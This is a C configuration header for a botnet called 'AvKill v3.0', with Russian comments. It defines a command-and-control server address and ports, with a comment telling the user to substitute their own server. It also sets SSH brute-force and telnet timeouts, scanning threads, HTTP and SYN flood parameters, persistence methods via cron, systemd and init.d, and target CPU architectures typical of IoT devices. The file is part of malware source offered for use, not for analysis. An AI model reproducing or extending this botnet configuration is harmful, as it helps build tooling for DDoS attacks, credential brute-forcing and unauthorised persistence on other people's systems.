// bot/config.h
#ifndef CONFIG_H
#define CONFIG_H

// C2 сервер (ЗАМЕНИТЬ НА СВОЙ!)
#define C2_SERVER "185.216.71.123"
#define C2_PORT 1337
#define C2_SSL_PORT 443

// Настройки бота
#define BOT_VERSION "AvKill v3.0"
#define BOT_ID_SIZE 32
#define MAX_PAYLOAD_SIZE 1024*1024  // 1MB

// Эксплойты
#define SSH_BRUTE_TIMEOUT 5
#define TELNET_TIMEOUT 3
#define SCAN_THREADS 50

// DDoS
#define MAX_DDOS_THREADS 500
#define HTTP_FLOOD_DELAY 10  // ms
#define SYN_FLOOD_PPS 1000   // packets per second

// Persistence методы
#define PERSIST_CRON 1
#define PERSIST_SYSTEMD 2
#define PERSIST_INITD 3

// Архитектуры
typedef enum {
    ARCH_X86,
    ARCH_X64,
    ARCH_ARM,
    ARCH_ARM7,
    ARCH_MIPS,
    ARCH_MIPSEL
} arch_t;

#endif